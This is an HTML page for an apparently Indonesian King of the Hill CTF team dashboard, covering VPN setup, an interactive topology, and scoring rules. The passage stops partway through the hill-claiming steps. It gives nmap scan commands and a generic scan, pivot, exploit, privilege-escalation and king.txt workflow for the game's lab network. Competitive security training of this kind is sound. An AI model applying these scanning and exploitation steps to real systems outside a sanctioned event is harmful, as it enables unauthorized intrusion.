@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KoTH CTF — Team Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚔️</text></svg>">
+    <style>
+        :root {
+            --bg-primary:#0a0e17;--bg-secondary:#111827;--bg-card:#1a2332;--bg-hover:#243044;
+            --border:#2a3a4e;--text-primary:#e2e8f0;--text-secondary:#94a3b8;--text-muted:#64748b;
+            --accent-green:#22c55e;--accent-red:#ef4444;--accent-blue:#3b82f6;--accent-cyan:#06b6d4;
+            --accent-orange:#f97316;--accent-purple:#a855f7;--accent-gold:#fbbf24;
+            --font-mono:'JetBrains Mono',monospace;--font-sans:'Inter',sans-serif;--radius:8px;
+        }
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:var(--font-sans);background:var(--bg-primary);color:var(--text-primary);min-height:100vh;}
+
+        /* ── Navbar ── */
+        .navbar{display:flex;align-items:center;justify-content:space-between;padding:12px 28px;background:linear-gradient(135deg,#111827,#1e293b);border-bottom:2px solid var(--accent-green);position:sticky;top:0;z-index:100;}
+        .nav-left{display:flex;align-items:center;gap:14px;}
+        .nav-logo{font-size:28px;filter:drop-shadow(0 0 8px rgba(34,197,94,.4));}
+        .nav-title{font-size:15px;font-weight:900;background:linear-gradient(135deg,var(--accent-green),var(--accent-cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+        .nav-sub{font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;}
+        .nav-links{display:flex;align-items:center;gap:6px;}
+        .nav-links a{color:var(--text-secondary);text-decoration:none;font-size:12px;font-weight:700;padding:8px 14px;border-radius:6px;transition:all .15s;}
+        .nav-links a:hover,.nav-links a.active{background:var(--bg-hover);color:var(--accent-cyan);}
+        .nav-user{display:flex;align-items:center;gap:12px;}
+        .nav-user .team-badge{background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);padding:6px 14px;border-radius:6px;font-size:12px;font-weight:700;color:var(--accent-green);}
+        .nav-user .cat-badge{font-size:10px;padding:4px 10px;border-radius:10px;font-weight:700;}
+        .cat-team{background:rgba(59,130,246,.15);color:var(--accent-blue);}
+        .btn-logout{background:none;border:1px solid var(--border);color:var(--text-muted);padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:700;font-family:var(--font-sans);transition:all .15s;}
+        .btn-logout:hover{border-color:var(--accent-red);color:var(--accent-red);}
+
+        /* ── Main ── */
+        .main{max-width:1200px;margin:0 auto;padding:24px 28px;}
+        .page-section{display:none;}
+        .page-section.active{display:block;}
+        .page-title{font-size:20px;font-weight:900;margin-bottom:20px;}
+
+        /* ── Cards ── */
+        .card{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:20px;}
+        .card h3{font-size:13px;text-transform:uppercase;letter-spacing:1px;color:var(--accent-cyan);margin-bottom:14px;}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
+
+        /* ── Welcome Banner ── */
+        .welcome{background:linear-gradient(135deg,rgba(34,197,94,.08),rgba(6,182,212,.08));border:1px solid rgba(34,197,94,.2);border-radius:var(--radius);padding:28px;margin-bottom:24px;text-align:center;}
+        .welcome h2{font-size:22px;font-weight:900;margin-bottom:6px;}
+        .welcome p{color:var(--text-secondary);font-size:14px;}
+
+        /* ── Stats ── */
+        .stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px;}
+        .stat-box{background:var(--bg-secondary);border-radius:6px;padding:16px;text-align:center;}
+        .stat-box .val{font-size:26px;font-weight:900;font-family:var(--font-mono);}
+        .stat-box .lbl{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--text-muted);margin-top:2px;}
+        .stat-box.green .val{color:var(--accent-green);}
+        .stat-box.cyan .val{color:var(--accent-cyan);}
+        .stat-box.blue .val{color:var(--accent-blue);}
+        .stat-box.orange .val{color:var(--accent-orange);}
+        .stat-box.purple .val{color:var(--accent-purple);}
+
+        /* ── Step Cards ── */
+        .step{display:flex;gap:16px;margin-bottom:18px;padding:16px;background:var(--bg-secondary);border-radius:8px;border-left:3px solid var(--accent-cyan);}
+        .step-num{font-size:24px;font-weight:900;color:var(--accent-cyan);font-family:var(--font-mono);min-width:36px;text-align:center;}
+        .step-body h4{font-size:14px;font-weight:700;margin-bottom:4px;}
+        .step-body p{font-size:13px;color:var(--text-secondary);line-height:1.6;}
+        .code-block{background:var(--bg-primary);border:1px solid var(--border);border-radius:6px;padding:12px 16px;margin-top:8px;font-family:var(--font-mono);font-size:12px;color:var(--accent-green);overflow-x:auto;position:relative;line-height:1.7;}
+        .code-block .copy-btn{position:absolute;top:6px;right:6px;background:var(--bg-hover);border:1px solid var(--border);color:var(--text-muted);padding:3px 8px;border-radius:4px;cursor:pointer;font-size:10px;font-family:var(--font-sans);}
+        .code-block .copy-btn:hover{color:var(--accent-cyan);}
+
+        /* ── Topology Canvas ── */
+        .topo-wrap{position:relative;}
+        .topo-controls{display:flex;gap:6px;margin-bottom:10px;}
+        .topo-controls button{background:var(--bg-card);border:1px solid var(--border);color:var(--text-primary);padding:6px 14px;border-radius:6px;cursor:pointer;font-size:14px;font-weight:700;transition:all .15s;}
+        .topo-controls button:hover{border-color:var(--accent-cyan);color:var(--accent-cyan);}
+        .topo-controls .zoom-label{font-size:11px;color:var(--text-muted);display:flex;align-items:center;margin-left:4px;font-family:var(--font-mono);}
+        .topo-container{position:relative;width:100%;height:600px;background:var(--bg-primary);border:1px solid var(--border);border-radius:8px;overflow:hidden;cursor:grab;}
+        .topo-container.grabbing{cursor:grabbing;}
+        .topo-inner{transform-origin:0 0;transition:transform .15s ease;position:relative;width:100%;height:600px;}
+        .topo-node{position:absolute;padding:12px 16px;background:var(--bg-card);border:2px solid var(--border);border-radius:10px;cursor:grab;user-select:none;text-align:center;min-width:120px;transition:border-color .2s,box-shadow .2s;z-index:10;}
+        .topo-node:hover{border-color:var(--accent-cyan);box-shadow:0 0 20px rgba(6,182,212,.2);}
+        .topo-node.selected{border-color:var(--accent-green);box-shadow:0 0 24px rgba(34,197,94,.3);}
+        .topo-node .node-icon{font-size:24px;margin-bottom:4px;}
+        .topo-node .node-name{font-size:12px;font-weight:700;color:var(--text-primary);}
+        .topo-node .node-ip{font-size:10px;font-family:var(--font-mono);color:var(--accent-cyan);margin-top:2px;}
+        .topo-node.vpn{border-color:rgba(168,85,247,.4);}
+        .topo-node.koth{border-color:rgba(34,197,94,.4);}
+        .topo-node.hill{border-color:rgba(249,115,22,.4);}
+        .topo-node.pivot{border-color:rgba(239,68,68,.4);}
+        .topo-node.team{border-color:rgba(59,130,246,.3);min-width:90px;padding:8px 10px;}
+        .topo-node.team .node-name{font-size:10px;}
+
+        /* Info Panel */
+        .topo-info{position:absolute;bottom:16px;left:16px;right:16px;background:rgba(26,35,50,.95);border:1px solid var(--border);border-radius:8px;padding:16px 20px;z-index:20;backdrop-filter:blur(10px);display:none;}
+        .topo-info.show{display:block;animation:fadeIn .2s;}
+        .topo-info h4{font-size:14px;font-weight:700;color:var(--accent-cyan);margin-bottom:8px;}
+        .topo-info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px;}
+        .topo-info-item{font-size:12px;}
+        .topo-info-item .k{color:var(--text-muted);font-size:10px;text-transform:uppercase;letter-spacing:.5px;}
+        .topo-info-item .v{font-family:var(--font-mono);color:var(--accent-green);font-weight:700;}
+
+        /* SVG lines */
+        .topo-svg{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+
+        /* Legend */
+        .topo-legend{display:flex;gap:16px;margin-top:12px;flex-wrap:wrap;}
+        .legend-item{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text-muted);}
+        .legend-dot{width:12px;height:12px;border-radius:3px;border:2px solid;}
+
+        /* ── Badge ── */
+        .badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:700;}
+        .badge-green{background:rgba(34,197,94,.15);color:var(--accent-green);}
+        .badge-red{background:rgba(239,68,68,.15);color:var(--accent-red);}
+        .badge-blue{background:rgba(59,130,246,.15);color:var(--accent-blue);}
+        .badge-orange{background:rgba(249,115,22,.15);color:var(--accent-orange);}
+
+        /* ── Table ── */
+        .tbl{width:100%;border-collapse:collapse;font-size:13px;}
+        .tbl th{text-align:left;padding:8px 12px;background:var(--bg-secondary);color:var(--text-muted);font-weight:700;text-transform:uppercase;font-size:11px;letter-spacing:.5px;}
+        .tbl td{padding:8px 12px;border-bottom:1px solid var(--border);}
+        .tbl .mono{font-family:var(--font-mono);}
+
+        /* ── Rules ── */
+        .rule-item{padding:12px 16px;background:var(--bg-secondary);border-radius:6px;margin-bottom:8px;font-size:13px;display:flex;gap:10px;align-items:flex-start;}
+        .rule-item .ri{font-size:16px;min-width:24px;text-align:center;}
+        .rule-item strong{color:var(--accent-green);}
+
+        /* ── Announcements ── */
+        .ann-item{padding:12px 16px;border-left:3px solid var(--accent-blue);background:var(--bg-secondary);border-radius:0 6px 6px 0;margin-bottom:10px;}
+        .ann-item.warning{border-color:var(--accent-orange);}
+        .ann-item.danger{border-color:var(--accent-red);}
+        .ann-item .ann-time{font-size:10px;color:var(--text-muted);font-family:var(--font-mono);}
+        .ann-item .ann-msg{font-size:13px;margin-top:2px;}
+
+        /* ── VPN Tabs ── */
+        .vpn-tabs{display:flex;gap:0;margin-bottom:20px;border-radius:8px;overflow:hidden;border:1px solid var(--border);}
+        .vpn-tab{flex:1;padding:14px 20px;background:var(--bg-secondary);color:var(--text-muted);font-size:14px;font-weight:700;cursor:pointer;border:none;font-family:var(--font-sans);transition:all .2s;text-align:center;}
+        .vpn-tab:hover{background:var(--bg-hover);color:var(--text-primary);}
+        .vpn-tab.active{background:linear-gradient(135deg,rgba(34,197,94,.15),rgba(6,182,212,.15));color:var(--accent-green);border-bottom:2px solid var(--accent-green);}
+        .vpn-tab-content{display:none;}
+        .vpn-tab-content.active{display:block;}
+
+        /* ── FAQ Accordion ── */
+        .faq-item{margin-bottom:8px;border:1px solid var(--border);border-radius:8px;overflow:hidden;background:var(--bg-secondary);}
+        .faq-q{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;cursor:pointer;font-size:14px;font-weight:700;color:var(--text-primary);transition:all .2s;gap:12px;user-select:none;}
+        .faq-q:hover{background:var(--bg-hover);}
+        .faq-q .faq-icon{font-size:11px;color:var(--accent-cyan);transition:transform .25s;flex-shrink:0;}
+        .faq-item.open .faq-q .faq-icon{transform:rotate(90deg);}
+        .faq-item.open .faq-q{border-bottom:1px solid var(--border);}
+        .faq-a{max-height:0;overflow:hidden;transition:max-height .3s ease;}
+        .faq-item.open .faq-a{max-height:600px;}
+        .faq-a-inner{padding:14px 18px;}
+
+        @keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+        @media(max-width:768px){
+            .grid-2{grid-template-columns:1fr;}
+            .nav-links{display:none;}
+            .topo-container{height:500px;}
+            .topo-info-grid{grid-template-columns:1fr;}
+        }
+    </style>
+</head>
+<body>
+
+<!-- ═══ NAVBAR ═══ -->
+<nav class="navbar">
+    <div class="nav-left">
+        <span class="nav-logo">⚔️</span>
+        <div>
+            <div class="nav-title">KoTH CTF</div>
+            <div class="nav-sub">King of the Hill — Team Dashboard</div>
+        </div>
+    </div>
+    <div class="nav-links">
+        <a href="/dashboard" data-page="home">🏠 Home</a>
+        <a href="/vpn" data-page="vpn">🔐 VPN Setup</a>
+        <a href="/topology" data-page="topology">🗺️ Topology</a>
+        <a href="/rules" data-page="rules">📋 Rules</a>
+        <a href="/guide" data-page="guide">📖 Guide</a>
+        <a href="/scoreboard">📊 Scoreboard</a>
+        <a href="/history">📈 History</a>
+    </div>
+    <div class="nav-user">
+        <span class="cat-badge" id="navCat"></span>
+        <span class="team-badge" id="navTeam">Loading...</span>
+        <button class="btn-logout" onclick="logout()">🚪 Logout</button>
+    </div>
+</nav>
+
+<!-- ═══ MAIN ═══ -->
+<div class="main">
+
+<!-- ─── HOME ─── -->
+<div class="page-section active" id="sec-home">
+    <div class="welcome">
+        <h2>Selamat Datang, <span id="welcomeName">Team</span>! ⚔️</h2>
+        <p>King of the Hill — Capture. Hold. Defend.</p>
+    </div>
+
+    <div class="stats-row" id="homeStats"></div>
+
+    <div class="grid-2">
+        <div class="card">
+            <h3>📡 Info Team Anda</h3>
+            <table class="tbl" id="teamInfoTbl">
+                <tbody></tbody>
+            </table>
+        </div>
+        <div class="card">
+            <h3>📢 Pengumuman Terbaru</h3>
+            <div id="homeAnnouncements" style="max-height:260px;overflow-y:auto;">
+                <p style="color:var(--text-muted);font-size:13px;">Belum ada pengumuman</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>⚡ Quick Start — 4 Langkah Mulai Bertanding</h3>
+        <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+                <h4>Setup VPN</h4>
+                <p>Download config WireGuard dari panitia, import ke WireGuard client, dan aktifkan koneksi. Detail lengkap di tab <strong>🔐 VPN Setup</strong>.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-body">
+                <h4>Recon & Scan</h4>
+                <p>Temukan dan akses Pivot DMZ melalui VPN network, lalu scan Hill 1-4 melalui pivot. Lihat <strong>🗺️ Topology</strong> untuk overview jaringan.</p>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+                <h4>Exploit & Capture</h4>
+                <p>Eksploitasi vulnerability di setiap Hill, dapatkan root access, lalu tulis nama team ke <code style="color:var(--accent-cyan);">/root/king.txt</code>.</p>
+                <div class="code-block">
+echo "<span id="qsTeamName">team-name</span>" > /root/king.txt<button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
+                </div>
+            </div>
+        </div>
+        <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-body">
+                <h4>Defend & Score</h4>
+                <p>Pertahankan akses root! Setiap <strong>60 detik</strong> scorebot membaca king.txt. Jika nama team anda tertulis DAN service SLA tetap hidup = <strong>+10 poin</strong> per tick per hill.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ─── VPN SETUP ─── -->
+<div class="page-section" id="sec-vpn">
+    <h2 class="page-title">🔐 VPN Setup</h2>
+
+    <!-- Connection Info -->
+    <div class="card">
+        <h3>📋 Info Koneksi VPN Anda</h3>
+        <table class="tbl">
+            <tbody>
+                <tr><td style="font-weight:700;width:180px;">VPN IP</td><td class="mono" id="vpnIpDisplay">-</td></tr>
+                <tr><td style="font-weight:700;">VPN Server</td><td class="mono" id="vpnServerDisplay">-</td></tr>
+                <tr><td style="font-weight:700;">WireGuard Port</td><td class="mono">51820/UDP</td></tr>
+                <tr><td style="font-weight:700;">VPN Network</td><td class="mono">10.10.0.0/24</td></tr>
+            </tbody>
+        </table>
+        <div style="margin-top:16px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;">
+            <button id="btnDownloadWG" onclick="downloadVpnConfig('wg')" style="background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:8px;transition:all .2s;">
+                🛡️ Download WireGuard Config
+            </button>
+            <button id="btnDownloadOVPN" onclick="downloadVpnConfig('ovpn')" style="background:linear-gradient(135deg,#f59e0b,#d97706);color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:8px;transition:all .2s;">
+                🔑 Download OpenVPN Config
+            </button>
+            <span id="vpnDownloadStatus" style="font-size:12px;color:var(--text-muted);"></span>
+        </div>
+    </div>
+
+    <!-- VPN Type Tabs -->
+    <div class="vpn-tabs">
+        <button class="vpn-tab active" onclick="switchVpnTab('wg',this)">🛡️ WireGuard</button>
+        <button class="vpn-tab" onclick="switchVpnTab('ovpn',this)">🔑 OpenVPN</button>
+    </div>
+
+    <!-- WireGuard Tab -->
+    <div class="vpn-tab-content active" id="vpnTab-wg">
+        <div class="card" style="margin-bottom:12px;">
+            <h3>📖 How to Connect — WireGuard</h3>
+
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-body">
+                    <h4>Install WireGuard</h4>
+                    <div class="code-block">sudo apt update && sudo apt install -y wireguard<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:12px;color:var(--text-muted);margin-top:8px;">Windows: Download dari <a href="https://www.wireguard.com/install/" target="_blank" style="color:var(--accent-cyan);">wireguard.com/install</a></p>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-body">
+                    <h4>Download & Import Config</h4>
+                    <p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px;">Klik tombol <strong>"🛡️ Download WireGuard Config"</strong> di atas, lalu:</p>
+                    <p style="font-size:13px;color:var(--text-muted);margin-bottom:8px;"><strong>Linux:</strong></p>
+                    <div class="code-block">sudo cp wg-<span class="vpnTeamSlug">team</span>.conf /etc/wireguard/wg0.conf<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:13px;color:var(--text-muted);margin-top:10px;margin-bottom:8px;"><strong>Windows:</strong> Buka WireGuard GUI → <code>Add Tunnel</code> → pilih file <code>wg-<span class="vpnTeamSlug">team</span>.conf</code></p>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-body">
+                    <h4>Aktifkan Koneksi</h4>
+                    <div class="code-block">sudo wg-quick up wg0<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:12px;color:var(--text-muted);margin-top:8px;">Windows: Klik <strong>Activate</strong> di WireGuard GUI</p>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">4</div>
+                <div class="step-body">
+                    <h4>Verifikasi Koneksi</h4>
+                    <p style="font-size:13px;color:var(--text-muted);margin-bottom:8px;">Cek status WireGuard:</p>
+                    <div class="code-block">sudo wg show<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:13px;color:var(--text-muted);margin-top:10px;margin-bottom:8px;">Scan VPN network untuk discovery:</p>
+                    <div class="code-block">nmap -sn 10.0.0.0/24<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:13px;color:var(--text-muted);margin-top:10px;margin-bottom:8px;">Scan port target yang ditemukan:</p>
+                    <div class="code-block">nmap -sT -Pn &lt;target-ip&gt;<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">5</div>
+                <div class="step-body">
+                    <h4>Matikan VPN (jika perlu)</h4>
+                    <div class="code-block">sudo wg-quick down wg0<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- OpenVPN Tab -->
+    <div class="vpn-tab-content" id="vpnTab-ovpn">
+        <div class="card" style="margin-bottom:12px;">
+            <h3>📖 How to Connect — OpenVPN</h3>
+
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-body">
+                    <h4>Install OpenVPN</h4>
+                    <div class="code-block">sudo apt update && sudo apt install -y openvpn<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:12px;color:var(--text-muted);margin-top:8px;">Windows: Download dari <a href="https://openvpn.net/community-downloads/" target="_blank" style="color:var(--accent-cyan);">openvpn.net/community-downloads</a></p>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-body">
+                    <h4>Download & Connect</h4>
+                    <p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px;">Klik tombol <strong>"🔑 Download OpenVPN Config"</strong> di atas, lalu:</p>
+                    <p style="font-size:13px;color:var(--text-muted);margin-bottom:8px;"><strong>Linux:</strong></p>
+                    <div class="code-block">sudo openvpn --config <span class="vpnTeamSlug">team</span>.ovpn<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:12px;color:var(--text-muted);margin-top:8px;">Tunggu sampai muncul: <code style="color:var(--accent-green);">Initialization Sequence Completed</code></p>
+                    <p style="font-size:13px;color:var(--text-muted);margin-top:10px;"><strong>Windows:</strong> Buka OpenVPN GUI → Import file <code><span class="vpnTeamSlug">team</span>.ovpn</code> → Connect</p>
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-body">
+                    <h4>Verifikasi Koneksi</h4>
+                    <p style="font-size:13px;color:var(--text-muted);margin-bottom:8px;">Cek interface tunnel:</p>
+                    <div class="code-block">ip addr show tun0<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                    <p style="font-size:13px;color:var(--text-muted);margin-top:10px;margin-bottom:8px;">Ping ke VPN network:</p>
+                    <div class="code-block">ping -c 3 &lt;koth-server-ip&gt;<button class="copy-btn" onclick="copyCode(this);event.stopPropagation();">📋</button></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Troubleshooting FAQ -->
+    <div class="card" style="margin-top:20px;">
+        <h3>⚠️ Troubleshooting</h3>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-q"><span>🔴 Tidak bisa ping?</span><span class="faq-icon">▶</span></div>
+            <div class="faq-a"><div class="faq-a-inner" style="font-size:13px;color:var(--text-secondary);line-height:1.7;">
+                Pastikan VPN aktif (<code>sudo wg show</code>), cek apakah firewall lokal memblokir, dan pastikan routing ke <code>10.0.0.0/24</code> melewati interface VPN.
+            </div></div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-q"><span>🔴 DNS tidak resolve?</span><span class="faq-icon">▶</span></div>
+            <div class="faq-a"><div class="faq-a-inner" style="font-size:13px;color:var(--text-secondary);line-height:1.7;">
+                Gunakan IP langsung. Hills diakses via IP, bukan domain.
+            </div></div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-q"><span>🔴 Koneksi lambat?</span><span class="faq-icon">▶</span></div>
+            <div class="faq-a"><div class="faq-a-inner" style="font-size:13px;color:var(--text-secondary);line-height:1.7;">
+                Cek MTU: <code>sudo ip link set mtu 1280 dev wg0</code>
+            </div></div>
+        </div>
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-q"><span>🔴 Hill 3 &amp; 4 unreachable?</span><span class="faq-icon">▶</span></div>
+            <div class="faq-a"><div class="faq-a-inner" style="font-size:13px;color:var(--text-secondary);line-height:1.7;">
+                Hills ini di belakang Pivot. Pastikan routing lewat pivot aktif. Anda mungkin perlu pivot melalui DMZ.
+            </div></div>
+        </div>
+    </div>
+</div>
+
+<!-- ─── TOPOLOGY ─── -->
+<div class="page-section" id="sec-topology">
+    <h2 class="page-title">🗺️ Network Topology — Interactive Map</h2>
+    <p style="color:var(--text-muted);font-size:13px;margin-bottom:14px;">Drag node untuk mengatur posisi. Klik node untuk melihat detail. Scroll / tombol untuk zoom.</p>
+
+    <div class="topo-wrap">
+        <div class="topo-controls">
+            <button onclick="topoZoom(0.1)" title="Zoom In">＋</button>
+            <button onclick="topoZoom(-0.1)" title="Zoom Out">－</button>
+            <button onclick="topoZoomReset()" title="Reset Zoom">↺ Reset</button>
+            <span class="zoom-label" id="zoomLabel">100%</span>
+        </div>
+        <div class="topo-container" id="topoCanvas">
+            <div class="topo-inner" id="topoInner">
+                <svg class="topo-svg" id="topoSvg"></svg>
+                <!-- Nodes akan di-generate oleh JS -->
+            </div>
+            <div class="topo-info" id="topoInfo">
+                <h4 id="infoTitle">-</h4>
+                <div class="topo-info-grid" id="infoGrid"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="topo-legend">
+        <div class="legend-item"><div class="legend-dot" style="border-color:var(--accent-purple);background:rgba(168,85,247,.15);"></div> VPN Server</div>
+        <div class="legend-item"><div class="legend-dot" style="border-color:var(--accent-green);background:rgba(34,197,94,.15);"></div> KoTH Server</div>
+        <div class="legend-item"><div class="legend-dot" style="border-color:var(--accent-red);background:rgba(239,68,68,.15);"></div> Pivot DMZ</div>
+        <div class="legend-item"><div class="legend-dot" style="border-color:var(--accent-orange);background:rgba(249,115,22,.15);"></div> Hill (Target)</div>
+        <div class="legend-item"><div class="legend-dot" style="border-color:var(--accent-blue);background:rgba(59,130,246,.15);"></div> Team (You)</div>
+        <div class="legend-item" style="margin-left:auto;color:var(--accent-cyan);font-weight:700;">--- Dashed: network link &nbsp; ── Solid: active route</div>
+    </div>
+
+    <div class="card" style="margin-top:20px;">
+        <h3>📡 Network Segments</h3>
+        <table class="tbl">
+            <thead><tr><th>Segment</th><th>CIDR</th><th>Deskripsi</th><th>Akses</th></tr></thead>
+            <tbody>
+                <tr><td>VPN Network</td><td class="mono">10.10.0.0/24</td><td>Semua peserta terhubung via WireGuard/OpenVPN</td><td><span class="badge badge-green">Direct</span></td></tr>
+                <tr><td>Game Network</td><td class="mono">10.46.0.0/20</td><td>Private VPC — server interconnect (DO internal)</td><td><span class="badge badge-red">No Access</span></td></tr>
+                <tr><td>Hill Network</td><td class="mono">10.0.0.0/24</td><td>Vulnerable machines & Pivot DMZ</td><td><span class="badge badge-orange">Via Pivot</span></td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="card">
+        <h3>🏔️ Target Hills</h3>
+        <table class="tbl">
+            <thead><tr><th>Hill</th><th>IP & Ports</th><th>Pivot?</th><th>Multiplier</th></tr></thead>
+            <tbody>
+                <tr><td style="font-weight:700;">Hill 1</td><td class="mono" style="color:var(--text-muted);">🔍 Scan to discover</td><td>No</td><td class="mono" style="color:var(--accent-green);">1.0x</td></tr>
+                <tr><td style="font-weight:700;">Hill 2</td><td class="mono" style="color:var(--text-muted);">🔍 Scan to discover</td><td>No</td><td class="mono" style="color:var(--accent-green);">1.0x</td></tr>
+                <tr><td style="font-weight:700;">Hill 3</td><td class="mono" style="color:var(--text-muted);">🔍 Scan to discover</td><td><span class="badge badge-orange">Behind Pivot</span></td><td class="mono" style="color:var(--accent-orange);">1.5x</td></tr>
+                <tr><td style="font-weight:700;">Hill 4</td><td class="mono" style="color:var(--text-muted);">🔍 Scan to discover</td><td><span class="badge badge-orange">Behind Pivot</span></td><td class="mono" style="color:var(--accent-orange);">1.5x</td></tr>
+            </tbody>
+        </table>
+        <p style="font-size:12px;color:var(--accent-orange);margin-top:10px;">⚠️ IP dan port sengaja disembunyikan. Gunakan recon & scanning melalui Pivot DMZ untuk menemukan target!</p>
+    </div>
+</div>
+
+<!-- ─── RULES ─── -->
+<div class="page-section" id="sec-rules">
+    <h2 class="page-title">📋 Peraturan & Mekanisme Scoring</h2>
+
+    <div class="card">
+        <h3>🎯 Tujuan Permainan</h3>
+        <p style="font-size:14px;color:var(--text-secondary);line-height:1.8;margin-bottom:12px;">
+            Kumpulkan poin sebanyak mungkin dengan <strong style="color:var(--accent-green);">menguasai (capture)</strong> dan <strong style="color:var(--accent-green);">mempertahankan (defend)</strong> server Hill. 
+            Setiap 60 detik, scorebot akan mengecek siapa "King" di setiap Hill. King mendapat poin!
+        </p>
+    </div>
+
+    <div class="grid-2">
+        <div class="card">
+            <h3>⚡ Scoring Formula</h3>
+            <div class="rule-item"><span class="ri">👑</span><div><strong>King Points</strong> = BASE (10) × Multiplier per tick per hill</div></div>
+            <div class="rule-item"><span class="ri">🩸</span><div><strong>First Blood</strong> = +50 bonus poin (pertama capture hill)</div></div>
+            <div class="rule-item"><span class="ri">🛡️</span><div><strong>Defense Streak</strong> = +5 bonus per tick berturut-turut memegang hill</div></div>
+            <div class="rule-item"><span class="ri">🔄</span><div><strong>Pivot Bonus</strong> = Hill di belakang pivot punya multiplier 1.5x</div></div>
+            <div class="rule-item"><span class="ri">⚠️</span><div><strong>SLA Required!</strong> Service hill HARUS tetap hidup. Jika service mati = <strong style="color:var(--accent-red);">0 poin</strong> meskipun anda King!</div></div>
+        </div>
+
+        <div class="card">
+            <h3>📏 Aturan Pertandingan</h3>
+            <div class="rule-item"><span class="ri">✅</span><div>Exploit vulnerability yang ada di setiap Hill</div></div>
+            <div class="rule-item"><span class="ri">✅</span><div>Gunakan tools apapun (Kali Linux, custom scripts, dll)</div></div>
+            <div class="rule-item"><span class="ri">✅</span><div>Serang Hill milik team lain untuk merebut King</div></div>
+            <div class="rule-item"><span class="ri">❌</span><div><strong style="color:var(--accent-red);">DILARANG</strong> menyerang infrastruktur (VPN server, KoTH server, Scorebot)</div></div>
+            <div class="rule-item"><span class="ri">❌</span><div><strong style="color:var(--accent-red);">DILARANG</strong> melakukan DoS ke VPN/scoreboard</div></div>
+            <div class="rule-item"><span class="ri">❌</span><div><strong style="color:var(--accent-red);">DILARANG</strong> mematikan service Hill secara sengaja (penalty!)</div></div>
+        </div>
+    </div>
+
+    <div class="card">
+        <h3>👑 Cara Claim Hill</h3>
+        <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+                <h4>Dapatkan Root Access di Host OS Hill</h4>
+                <p>Exploit vuln service → shell user → privilege escalation → root. Vuln services berjalan di Docker container, king.txt ada di <strong>host OS</strong>.</p>
+            </div>
+        </div>
+        <div class="step">
